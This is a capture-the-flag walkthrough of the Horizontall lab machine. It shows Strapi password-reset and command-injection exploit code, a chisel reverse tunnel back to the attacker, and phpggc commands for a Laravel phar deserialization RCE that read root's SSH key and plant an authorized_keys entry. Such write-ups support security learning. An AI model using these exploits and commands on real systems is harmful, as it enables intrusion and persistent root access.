# Horizontall Machine (10.10.11.105)

![Screenshot from 2022-02-09 15-51-45](https://user-images.githubusercontent.com/79413473/153178656-e2e02f73-4595-40c5-bec5-9b972891ec0c.png)

## Recon:
+ Port scan:
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```  
+ Add **Horizontall.htb** to hosts file also run some vhost fuzzing on it as there is nothing much on main domain.
```
ffuf -u http://horizontall.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -fc 301
```
+ Found *www* & **api-prod**. Add them to hosts file and api-prod.horizontall.htb gives welcome message
![Screenshot from 2022-02-09 16-13-34](https://user-images.githubusercontent.com/79413473/153182217-2a3b0ec2-ccf7-42e1-8d5a-5afdc407607b.png)

## Foothold: Exploiting strapi CVE
+ Running ffuf we get */admin* which redirect to login panel, looking back in burp you will see a request when accessing */admin* which reveals vulnerable strapi version
![Screenshot from 2022-02-10 19-49-36](https://user-images.githubusercontent.com/79413473/153426416-30960267-7072-4212-9b6a-055d5d534b59.png)
+ Google this strapi *version* number and you will get a [exploitdb](https://www.exploit-db.com/exploits/50239) which have a Unauthenticated RCE by chaining two CVEs. First reset admin password then execute code on machine by installing plugin.
```
 def password_reset():
 41     global url, jwt
 42     session = requests.session()
 43     params = {"code" : {"$gt":0},
 44             "password" : "SuperStrongPassword1",
 45             "passwordConfirmation" : "SuperStrongPassword1"
 46             }
 47     output = session.post(f"{url}/admin/auth/reset-password", json = params).text
 48     response = json.loads(output)
 49     jwt = response["jwt"]
 50     username = response["user"]["username"]
 51     email = response["user"]["email"]
```
Anyone can change admin' s password then it loads admin's jwt in response and use that, you can also login by **admin:SuperStrongPassword1** in browser

```
 def code_exec(cmd):
 59     global jwt, url
 60     print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
 61     headers = {"Authorization" : f"Bearer {jwt}"}
 62     data = {"plugin" : f"documentation && $({cmd})",
 63             "port" : "1337"}
 64     out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
 65     print(out.text)
```
This part here send a post request to */plugin/install* with our payload in plugin field & port number doesn't matter somehow here, you can even remove that field.You will have a blind RCE. Let's get a shell from here as **strapi** user

![Screenshot from 2022-02-10 20-30-31](https://user-images.githubusercontent.com/79413473/153434762-e13e758f-a386-4f26-b08a-a35dcc9179c4.png)


## Lateral Movement: Accessing laravel application through port forwarding
+ There is a **developer** user on machine, where *user* flag is world redable in home directory of him. We can enumerate a little bit find a **database.json** file in */opt/strapi/myapi/config/environments/development* directory .
```
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```
+ we can use this to login into mysql server as developer `mysql -u developer -p` but nothing interesting is there in database. Also it could have been an easy password reuse vulnerability but it wasn't.
+ You can't login as developer through this password. Let's enumerate a little bit more `ss -lntp` 

![Screenshot from 2022-02-10 20-42-37](https://user-images.githubusercontent.com/79413473/153436866-3bff1277-4f15-48a6-9321-be652eff8573.png)

+ Here Port 80 is normal website, and port 1337 is strapi vhost. `cat etc/nginx/sites-enabled/horizontall.htb`

```
server {
    # server block for 'horizontall.htb' domain
    listen 80;
    listen [::]:80;
    server_name horizontall.htb www.horizontall.htb;
    .....
}

server {
     listen [::]:80;
     listen 80;

     server_name api-prod.horizontall.htb;

     location / {
          proxy_pass http://localhost:1337; 
          ...
    }
}
```
+ Other ports are ssh and sql, but PORT 8000 is unnknown , curl it & you will find it's running **Laravel v8 (PHP v7.4.18)** .
+ Now in order to access this new port either we can use ssh-port forwarding through strapi user, creating .ssh dir in /opt/strapi as that's what it's hoem directory is, or you can use chisel to forward port.

![Screenshot from 2022-02-10 20-41-28](https://user-images.githubusercontent.com/79413473/153438654-7ec151e9-c260-4963-957f-65571b024aab.png)

+  As i have done ssh port forwarding many times but chisel never so for now i will now use chisel and googling chisel we get [0xdf blog](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) explaining chisel. [Chisel](https://github.com/jpillora/chisel) basically works on client server protocol. You make your attacker machine server and through victim machine you connect to this server as client and tells which host & port to forward to which host & port. 
+ It has same syntax as ssh port forwarding, and i undertand it as **[Port_You_want_Listen_on_Your_Machine]:[Localhost_on_victim_machine]:[port_which is_gonna_be_forwarded].** e.g
1. 8000:127.0.0.1:8000 will forward port 8000 on 127.0.0.1 host and i can access that on port 8000 on my machine
2. 8002:127.0.0.1:8000 port 8000 is forwarded and i can access it on port 8001 on my machine.
3. 8002:127.0.0.1:8084 port 8084 is forwarded and i can access it on 8002 on my machine.

again this is my notion of understanding of things i recommned watching ippsec and 0xdf.
+ `./chisel server -p 8084 --reverse` run this on attcker machine & `./chisel client 10.10.14.107:8084 R:8001:127.0.0.1:8000` on victim machine this will connect back to you and you can access local port 8000 website on port 8001 on your machine

![Screenshot from 2022-02-10 21-17-21](https://user-images.githubusercontent.com/79413473/153443727-f4ffefd4-e4de-4871-8fac-35d19522a10c.png)

![Screenshot from 2022-02-10 21-17-34](https://user-images.githubusercontent.com/79413473/153443770-8620adb0-9c6c-4a82-baa1-36f4b7247baf.png)

## Privilege Escaltion: CVE-2021-3129 phar deserilization vulnerability

+ As we can access laravel website now, but there is nothing much to access here but googling **Laravel v8 (PHP v7.4.18)** thorows a laravel debug mode rce  CVE-2021-3129. You can read more about it in detail [here](https://www.ambionics.io/blog/laravel-debug-rce). I used this [exploit](https://github.com/ambionics/laravel-exploits) tool to gain access. 
+ In this CVE application was runing into debug mode and was vulnerbale to phar deserilization attack. We could inject arbitrary content into logs and larvael.log files were converted to phar file and then serliazed code in log file is executed through **phar://** wrapper. You can spend some time understanding exploit chain
+ Let's create a phar file first
 `php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id ` to run **id** command. It uses php gadget chain to create phar file. You can get phpgcc [here](https://github.com/ambionics/phpggc). 
+ Now we will runt the exploit by supplying url & phar file location
  `python3 laravel-ignition-rce.py http://127.0.0.1:8001/ /tmp/exploit.phar`
  
![Screenshot from 2022-02-10 22-16-35](https://user-images.githubusercontent.com/79413473/153455350-c40b5d45-f632-4461-855d-08c072c203ee.png)

wow we are running as root already. Let's read root ssh-keys and get login on machine.
`php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /root/.ssh/id_rsa"` then run exploit script.

![Screenshot from 2022-02-10 22-20-24](https://user-images.githubusercontent.com/79413473/153456049-f4e4e126-b788-42ba-97b9-a33117e55d2d.png)

Looks like we can't read big files or there is no .ssh directory maybe, i could read root flag. Let's add our ssh-keys on machine.
```
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
total 68
drwx------  7 root root  4096 Feb 10 16:53 .
drwxr-xr-x 24 root root  4096 Aug 23 11:29 ..
lrwxrwxrwx  1 root root     9 Aug  2  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  3145 Jun  1  2021 .bashrc
-rwxr-xr-x  1 root root   185 May 28  2021 boot.sh
drwx------  2 root root  4096 Jun  3  2021 .cache
drwx------  3 root root  4096 Jun  3  2021 .gnupg
drwxr-xr-x  3 root root  4096 May 25  2021 .local
-rw-------  1 root root   550 Aug  2  2021 .mysql_history
-rw-r--r--  1 root root     6 Feb 10 16:53 pid
drwxr-xr-x  5 root root  4096 Jul 29  2021 .pm2
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root   384 Jul 29  2021 restart.sh
-r--------  1 root root    33 Feb 10 05:22 root.txt
drwx------  2 root root  4096 May 25  2021 .ssh
-rw-rw-rw-  1 root root 12069 Aug  3  2021 .viminfo
--------------------------
+ Logs cleared
``` 
ssh directory exists, let's add keys
```
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "echo 'your id_rsa.pub key' > /root/.ssh/authorized_keys"
```
+ Now login as root `ssh -i id_rsa root@horizontall.htb` 

![Screenshot from 2022-02-10 22-29-40](https://user-images.githubusercontent.com/79413473/153457828-72ae9fc1-aa89-44b5-acb4-94ab0dc2fc8d.png)

And we have successfully rooted the machine.







